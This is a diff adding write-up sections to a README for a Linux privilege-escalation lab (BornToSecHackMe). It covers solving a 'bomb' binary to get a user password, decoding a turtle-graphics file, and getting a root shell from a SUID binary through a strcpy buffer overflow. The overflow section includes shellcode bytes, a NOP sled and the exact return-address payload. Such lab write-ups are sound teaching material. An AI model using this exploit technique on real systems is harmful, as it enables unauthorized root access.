@@ -7,6 +7,8 @@
     - [Writeup 1](#writeup-1)
         - [lmezard](#lmezard)
         - [laurie](#laurie)
+        - [thor](#thor)
+        - [zaz](#zaz)
     - [Writeup 2](#writeup-1)
     - [Writeup 3](#writeup-1)
     - [Writeup 4](#writeup-1)
@@ -19,9 +21,7 @@ Project about multiple privilege escalations on Linux.
 
 - Status: finished
 - Result: 125%
-- Observations:
-    - It is compatible with Linux and Mac OS.
-    - It does not use `VT100` escape characters.
+- Observations: NULL
 
 ## Writeups
 
@@ -240,3 +240,318 @@ echo -n 'Iheartpwnage' | sha256sum
 #### laurie
 
 Let's login as `laurie`.
+
+The challenge of this user is the `bomb` binay, let's run to see what it does:
+```bash
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+
+foo
+
+BOOM!!!
+The bomb has blown up.
+```
+
+And we have some hint in the `README`:
+```raw
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+By reversing the binary and running some gdb, which I will not exploin, we
+find that the phase 1 is just expecting some literal string:
+```raw
+Public speaking is very easy.
+```
+
+Passed, phase 2 is more complex, it expects 6 numbers, it runs
+`sscanf("%d %d %d %d %d %d", ...)`, and then checks that the first number is
+`1`, and for the other 5 numbers, it expects this:
+```raw
+n      == current number
+index  == index of the number
+prev_n == previus number
+
+n == index * prev_n
+```
+
+For the sequence `1 2 3 4 5 6`, it will check (skipping the first number, which
+must be `1`):
+```c
+2 == 2 * 1
+3 == 3 * 2 // KO
+4 == 4 * 3 // KO
+5 == 5 * 4 // KO
+6 == 6 * 5 // KO
+```
+
+A little thinking gives us the following equation, just keep resolving it
+for 5 numbers, that will be our sequence:
+```c
+2 == 2 * 1
+? == 3 * 2
+```
+```c
+2   == 2 * 1
+6   == 3 * 2
+24  == 4 * 6
+120 == 5 * 24
+720 == 6 * 120
+```
+
+Seems good, and indeed, the following sequence worked for phase 2:
+```raw
+1 2 6 24 120 720
+```
+
+It worked! I also notice we can create a file and pass it as a parameter, so
+`bomb` will read for it and when it ends it change to `stdin`, whichi means
+we can save there what we have until know, so when we execute `bomb` we
+start in the phase we ane currently in:
+```bash
+echo 'Public speaking is very easy.' > defuse
+echo '1 2 6 24 120 720' >> defuse
+
+./bomb ./defuse
+```
+
+Let's go whith phase 3, it seems this phase runs `sscanf("%d %c %d")`, and
+then it has varius cases depending on the value of the first `%d`.
+
+But, in short, it will expect a specific `%c` and `%d` on each case, let's
+focus on only one, the first one, which is with if the first `%d == 0`.
+
+It will check that the other `%d == 777`, and it will save a `'q'` in a local
+variable, to later check that `%c == local_variable`, so the payload will be:
+```raw
+0 q 777
+```
+
+Save it in the `./defuse` file and let's continue with phase 4.
+
+This phase runs `sscanf("%d")`, it explodes if the `value < 1`, and
+then it calls a function passing it as parameter, and expects the return to
+be `55`, or it explodes. So, we know our value must be `>= 1`.
+
+That mysterious function is recursive, and it does something in the lines of:
+```c
+int function(int n)
+{
+    int n1;
+    int n2;
+
+    if (n < 2) {
+        n2 = 1;
+    } else {
+        n1 = function(n - 1);
+        n2 = function(n - 2);
+        n2 = n2 + n1;
+    }
+    return n2;
+}
+```
+
+So, I made a `./scripts/phase4.c` file that bruteforces this until it returns
+`55`, the results is `9`. Add it to the `defuse` file.
+
+Phase 5, this is getting harder... Let's break this phase down:
+- It uses a custom `strlen` that works as expected, and checks our input has a length of `6`.
+- Then it does an `AND <character>,15` for each character, and using the result as an index, it saves the corresping element from the array `"isrveawhobpnutfg"` in a local variable.
+- Then it compares that local variable with `"giants"`, using a custom `strcmp`, that I hope is implemented as expected, because I don't want to check it.
+
+We need to find a suitable string, let's make a program that finds it for us,
+check it at `./scripts/phase5.c`.
+
+The result string is:
+```raw
+o`ekma
+```
+
+Phase 6, the last phase, as expected, this one seems difficult.
+
+It seems is reads 6 numbers with `sscanf("%d %d %d %d %d %d")`.
+
+Later it makes a lot of checks, let's break them down:
+- It iterates and checks that (being `n` the number):
+    - If `n - 1 > 5` explodes, so `n` must be `n <= 6`.
+    - It also checks that there are not duplicate numbers.
+- It copies the values to a local array, but ff `n > 1` it does a lot of weird things with a global array a 2D int matrix.
+- ...
+
+So sorry, but knowing tha the hint is `4`, we know that's the first number, so
+I'm just gonna bruteforce it.
+
+Compile and launch `./scripts/phase6.c`, the resulting combination is:
+```raw
+Cracked: 4 2 6 3 1 5
+```
+
+As the subject suggest, the password of the next user (`thor`) is the
+combination off all the solutions, so:
+```raw
+Public speaking is very easy.
+1 2 6 24 120 720
+0 q 777
+9
+o`ekma
+4 2 6 3 1 5
+```
+
+Let's remove the spaces:
+```raw
+Publicspeakingisveryeasy.126241207200q7779o`ekma426315
+```
+
+But it didn't work, after some research I found out that, becasue two levels
+solution can vary, one is the phase 3, were multiple inputs are valid, but
+if we look at the `hints` file, the valid input contains a `b`, I was doing the
+`q` case, so the valid answer is:
+```raw
+1 b 214
+```
+
+Now, the password should work:
+```raw
+Publicspeakingisveryeasy.126241207201b2149o`ekma426315
+```
+
+But, no, the phase 5 also have multiple valid answer, the expected one was:
+```bash
+opekmq
+```
+
+And phase 6 also has another valid answer it seems, we just need to swap `3` and `1`:
+```raw
+4 2 6 1 3 5
+```
+
+So, let's change our password one more time:
+```raw
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
+
+I do not like this project at all, the phase 3 variation was okey because
+the `hint` helped, but the phase 5 and phase 6 multiple solutions can't be
+justified.
+
+#### thor
+
+This one is easy, I'm not proud of where I came from, but I came from python
+and C#, and this seems like `turtle`s instructions!
+
+So, because I'm now proud of where I am, I'm of course gonna make all the
+programs in C or C++, with no exception, so, I created a C++ program that
+will parse a file like the one we are given, and generates a `.py` script
+with `turtle`, that we can run.
+
+The program is located at `./scripts/turtle_parser.cc`, just run it with
+the file as first parameter. We'll need to retrieve the file from the machine
+becouse we can't run a graphics program like `turtle` in it:
+```bash
+cd ./scripts
+./recv thor turtle
+g++ turtle_parser.cc -o turtle_parser
+./turtle_parser ./files/turtle out.py
+
+python3 ./out.py
+```
+
+The drawing is a bit strange, let's try to identify the letters one by one while
+it's drawing them.
+
+The resulting word is:
+```raw
+SLASH
+```
+
+The `turtle` file also tells us to "digest" the message
+(MD5 is a "message-digest" algo):
+I spent I while, but eventually I figure that like a previus user, the actual
+password is `SLASH` hashed:
+```raw
+echo -n 'SLASH' | md5sum
+```
+
+#### zaz
+
+The `mail` files are empty, let's check the `exploit_me` binary, that is owned
+by `root` and has the `SUID` bit.
+
+I tried a large input and it segfaulted, so it's seems like a BOF.
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped
+```
+
+It's a pretty simple binary, it was easy to reverse, this is the source code:
+```c
+int main(int argc,char **argv)
+{
+	char buff[140];
+
+	if (argc > 1) {
+		strcpy(buff, argv[1]);
+		puts(buff);
+	}
+	return (int)(argc < 2);
+}
+```
+
+So yeah... It's a simple BOF, that `strcpy` is sus.
+
+Let's do the usual, open it with `gdb` and send a pattern payload large enought
+to overflow `buff`:
+```bash
+gdb -q ./exploit_me
+r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+```
+
+Let's calculate the offset, remember the OS is little endian, so `0x37654136`
+would be: `6Ae7`. That's `140` offset, we could have guessed that of course,
+but I prefer to be sure.
+
+So, get some [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html),
+export it in a env variable with a `nop` sled of course, and compile our
+`./scripts/getaddr.c` to get the env variable address.
+
+```bash
+export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+gcc getaddr.c -o getaddr
+./getaddr SC
+# SC address: 0xXXXXXXXX
+```
+
+Forge the payload:
+- `140` offset bytes.
+- Shellcode address in little-endian.
+
+```bash
+# SC address: 0xbffffeb3
+./exploit_me $(python -c "print 'A'*140+'\xb3\xfe\xff\xbf'")
+```
+
+And there we go:
+```bash
+# whoami
+root
+```
+
+### Writeup 2
+
+`TODO`...
